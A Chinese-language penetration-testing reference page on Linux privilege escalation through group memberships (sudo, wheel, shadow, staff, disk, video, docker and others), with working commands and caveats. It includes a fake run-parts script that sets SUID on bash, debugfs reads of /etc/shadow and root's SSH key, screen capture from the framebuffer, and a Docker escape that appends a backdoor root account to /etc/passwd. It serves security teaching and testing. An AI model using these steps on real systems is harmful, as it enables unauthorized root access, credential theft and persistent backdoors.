# 有趣的组 - Linux 提权

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/管理员组

### **PE - 方法 1**

**有时**，系统的 **/etc/sudoers** 策略（或其中包含的文件）会包含如下条目：<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

这意味着，任何与任一条目匹配的用户，都可以通过 `sudo` 以任意目标用户身份运行任何命令（受策略其余部分限制）。<sup>[[3]](#references)</sup>

如果是这种情况，要**成为 root，你只需执行**：

```
sudo su
```

如果 `sudo -l` 允许仅指定用户名来受限调用 `adduser`，请检查它是否会创建一个同名且尚不存在的主组。新账户加入该组后，可能会获得权限，前提是有效的 sudoers 策略已授予 `%group` 相应权限；在将其视为提权路径前，请确认组创建行为和组规则。创建账户会更改系统，因此请先检查策略。

### PE - Method 2

查找所有 suid 二进制文件，并检查是否存在 **Pkexec** 二进制文件：

```bash
find / -perm -4000 2>/dev/null
```

如果 **pkexec 是 SUID 二进制文件**，只有在 polkit 授权所请求的操作时，它才能以其他用户身份执行程序；仅有 SUID 位并不能保证获得 root 权限。请检查已安装的策略以及目标会话的授权，而不要假设属于 **sudo** 或 **admin** 组就足够了。<sup>[[4]](#references)[[5]](#references)</sup>

对于独立的 [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) 攻击路径，首先确认 `pkexec` 是一个由 **root 拥有的 SUID** 可执行文件。已安装的二进制文件如果没有该位，就不属于公告所述的本地 SUID 提权情形。上游版本字符串只能作为线索：发行版可能会[将修复反向移植到较旧的软件包版本](https://ubuntu.com/security/CVE-2021-4034)，因此在判定其存在漏洞之前，请检查已安装的厂商软件包及缓解措施。

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) 是另一种 polkit 攻击路径：D-Bus 授权竞态，而不是 `pkexec` SUID 漏洞。请检查已安装的厂商 polkit 软件包，以及是否存在可触达的特权 D-Bus 操作，能够造成有用的更改；通过创建账户的途径还需要合适的服务，例如 AccountsService，而新组的 sudo 访问权限取决于实际生效的 sudo 策略。仅凭报告的 polkit 版本或已安装的服务，只能将其视为潜在目标，尤其是在厂商可能[反向移植修复](https://access.redhat.com/security/cve/cve-2021-3560)的情况下。被动枚举不应触发该竞态。

在仍使用旧版 Local Authority 后端的发行版上，使用以下命令检查其组规则：

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

相关组名和默认设置因发行版而异；只有本地策略中列出的组才有用。<sup>[[5]](#references)</sup>

要**成为 root，您可以执行**：

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

如果你尝试执行 **pkexec** 并遇到此 **错误**：

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

在没有注册身份验证代理的 SSH 会话中，即使策略原本允许该操作，`pkexec` 也可能报错；polkit 将 `pkttyagent` 记录为适用于非桌面会话的文本身份验证代理。具体行为取决于版本和发行版，因此请核实本地策略和代理设置。据报告，受影响的 NixOS 版本有一种变通方法，需要使用**两个不同的 SSH 会话**。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

禁止某个账户访问 `su` 的 ACL 管控的是该可执行文件，而不是所有能够执行管理员授权操作的途径。如果管理员凭据通过其他途径泄露，应检查有效的 polkit 策略是否允许通过 `systemd-run` 启动单次系统服务、身份验证代理接受哪个身份，以及最终服务将以哪个身份运行。[Polkit 区分以会话所有者身份进行身份验证和以管理员身份进行身份验证](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)，而 [systemd-run 可以请求系统管理器启动单次服务](https://systemd.io/CONTROL_GROUP_INTERFACE/)。历史记录条目、已安装的命令或可读的策略文件，本身都不能证明操作已获授权或凭据有效；被动检查不应提交凭据或启动单元。

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel 组

有时，sudoers 策略中也可能包含以下条目：

```
%wheel	ALL=(ALL:ALL) ALL
```

这意味着，任何匹配该条目的用户都可以通过 `sudo` 以任意目标用户身份运行任何命令（但仍受策略其他部分的限制）。<sup>[[3]](#references)</sup>

如果是这样，**要成为 root，你只需执行**：

```
sudo su
```

## shadow 组

在权限允许的系统上，**shadow** 组中的用户可以**读取** **/etc/shadow**；请检查目标系统上的实际权限模式和 ACL：<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

所以，读取该文件并尝试 **crack 一些 hashes**。

在分类 hashes 时，快速了解一下锁定状态：
- 带有 `!` 或 `*` 的条目通常不能用于交互式密码登录。
- `!hash` 表示密码已被锁定；其余字符表示锁定前密码字段中的内容。
- 包含 `*` 的字段不是有效的 `crypt(3)` hash，且会阻止 UNIX 密码登录；不要据此推断之前是否设置过密码。
即使无法直接登录，这些信息也有助于对账户进行分类。<sup>[[6]](#references)</sup>

## Staff 组

**staff**：允许用户在无需 root 权限的情况下对系统（`/usr/local`）进行本地修改（请注意，`/usr/local/bin` 中的可执行文件位于所有用户的 PATH 变量中，因此可能会“覆盖”`/bin` 和 `/usr/bin` 中同名的可执行文件）。可与更偏向监控/安全的组“adm”进行比较。<sup>[[2]](#references)[[7]](#references)</sup>

在 `/usr/local/bin` 位于 `PATH` 中 `/usr/bin` 之前的 Debian 配置中（如下例所示），不带路径的命令会优先解析为 `/usr/local/bin` 中的副本；请确认目标系统上的有效 `PATH`。

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

如果特权进程通过可写的 `/usr/local/bin` 解析未限定路径的命令，替换该命令即可利用进程的权限执行；测试前请确认实际路径和触发条件。

在 Ubuntu 系统上，登录时 `pam_motd` 会以 root 身份通过 `run-parts --lsbsysinit` 运行可执行脚本；cron 作业也可能使用 `run-parts`，但这取决于发行版和配置。<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

在新的 SSH 登录时，`pspy` 可以帮助确认目标上是否确实会调用此路径；它无需 root 权限即可观察进程命令行。<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## 磁盘组

加入 **disk** 组可能会获得对块设备的原始访问权限，通常**接近 root 权限**；Debian 将其描述为基本等同于 root，但请在目标系统上核实实际的设备权限和存储布局。<sup>[[7]](#references)</sup>

常见设备路径包括 `/dev/sd*`，但 NVMe 和其他存储布局使用不同的名称。

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` 可在 ext2/ext3/ext4 文件系统上运行；上文中的 `/root` 和 `/etc/shadow` 等路径，是已打开文件系统中的文件，而 `dump` 的第二个参数则是本机文件系统上的输出路径。<sup>[[8]](#references)</sup> 例如，以下命令会将已打开文件系统中的 `/tmp/asd1.txt` 提取到本机文件系统上的 `/tmp/asd2.txt`：

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` 选项以读写模式打开文件系统，`write` 命令会将本机文件复制到已打开的文件系统中。避免在已挂载的运行文件系统上使用它，因为直接编辑可能会损坏文件系统；尽可能使用离线镜像进行操作。<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## 视频组

使用命令 `w` 可以查看**谁已登录系统**，输出示例如下。<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** 条目标识第一个 Linux 虚拟控制台；它本身并不能证明用户就在机器旁边，尤其是在容器或其他环境中。<sup>[[21]](#references)</sup>

在提供可读帧缓冲设备的系统上，属于 **video** 组可能会获得对该设备的访问权限。Linux 帧缓冲接口文档指出，`/dev/fb0` 是可读的内存设备，可将其内容复制为屏幕快照；只有在存在相应 fbdev sysfs 属性时，`/sys/class/graphics/fb0/virtual_size` 路径才可用，因此请先检查目标系统。<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

如果已安装的 **GIMP** 版本提供原始数据导入器，请使用该导入器打开 **`screen.raw`**；不同版本和插件的支持情况及控件可能有所不同。<sup>[[22]](#references)</sup>

![磁盘组 - 视频组：要打开原始图像，可以使用 GIMP，选择 screen.raw 文件，并将文件类型选为 Raw image data](<../../../images/image (463).png>)

将图像宽度和高度设置为与帧缓冲区几何尺寸相匹配；尝试可用的像素格式/图像类型，直到输出清晰可辨。<sup>[[9]](#references)</sup>

![磁盘组 - 视频组：然后将宽度和高度修改为屏幕使用的尺寸，并尝试不同的图像类型（选择屏幕显示效果最好的一种）](<../../../images/image (317).png>)

## Root 组

加入 **root** 组不会获得 root 的 UID，但由 `root` 拥有且组成员可写的文件仍值得关注，尤其是特权服务或库会读取这些文件时。在将其视为权限提升途径之前，请确认文件的实际权限及其用途。

**检查 root 组成员可以修改哪些文件**：

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker Group

在标准的 rootful 安装中，加入 `docker` 组即可获得 Docker daemon 的 root 级访问权限。由于 bind mount 默认具有读写权限，能够控制该 daemon 的用户可以将主机的 `/` 挂载到容器中并修改主机文件；这实际上等同于获得主机上的 root 权限。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

`/etc/group`、`/etc/gshadow` 与当前进程令牌中的组成员信息可能不同步。如果用户不在 `id -nG` 的输出中，但执行 `newgrp docker` 成功，请检查新 shell 中 `id` 显示的组，并确认 Docker socket 是否确实可写且连接的是 rootful daemon。仅凭组名无法确认用户能控制主机。对任何自动化的 `newgrp` 探测设置超时限制，以免密码提示导致枚举卡住。

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

最后，如果你不喜欢前面的建议，或者它们因某些原因不起作用（比如 docker API 防火墙？），你总可以尝试**运行一个 privileged container 并从中逃逸**，具体说明见此处：

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

如果你对 docker socket 有写入权限，请阅读[**这篇介绍如何滥用 docker socket 提升权限的文章**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**。**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 组

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm 组

通常，**`adm` 组的成员**有权限**读取**位于 _/var/log/_ 中的日志文件。\
因此，如果你攻陷了该组中的一个用户，务必**查看日志**。<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail 组

这些组的含义取决于具体服务和发行版。Debian 文档说明，`backup` 组用于委派备份/恢复权限，`lp` 组用于打印机守护进程，而 `mail` 组用于访问 `/var/mail`；因此，在将组成员身份视为提权途径之前，应先检查本地权限。<sup>[[7]](#references)</sup>

它们通常是**凭据发现**途径，而非直接获取 root 权限的途径：
- **backup**：可能暴露包含配置、密钥、数据库转储或令牌的归档文件。
- **operator**：特定平台上的运维访问权限，可能泄露敏感的运行时数据。
- **lp**：打印队列/假脱机文件可能包含文档内容。
- **mail**：邮件假脱机文件可能暴露密码重置链接、OTP 和内部凭据。

应将此类组成员身份视为高价值的数据暴露问题，并通过复用密码/令牌继续扩大访问范围。

## Auth 组

在 OpenBSD 上，配置 S/Key 后，`/etc/skey` 归 `root:auth` 所有，访问其中的记录需要 `auth` 组权限；YubiKey 记录则存储在 `/var/db/yubikey` 中。<sup>[[16]](#references)[[17]](#references)</sup> 在启用了 S/Key 或 YubiKey 的易受攻击的 OpenBSD 6.6 配置中，拥有 `auth` 权限的本地用户可以获得 root 权限；Qualys 记录了利用的前提条件和利用链，相关 PoC 则实现了这一过程。<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [无 GUI 会话时的 pkexec/pkttyagent 身份验证（NixOS issue #18012）](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian 手册页](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit 参考手册](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit 参考手册](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian 安全手册](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux 手册页](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [帧缓冲设备 — Linux 内核文档](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu 手册页](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian 手册页](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — 非特权 Linux 进程窥探工具](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine 安全性](https://docs.docker.com/engine/security/)
- [14] [以非 root 用户身份管理 Docker](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [运行容器 — Docker 文档](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD 手册页](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD 手册页](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD 中的身份验证漏洞 — Qualys 安全公告](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — 本地漏洞利用 PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux 已分配设备（4.x+ 版本）](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [图像导入与导出 — GIMP 文档](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
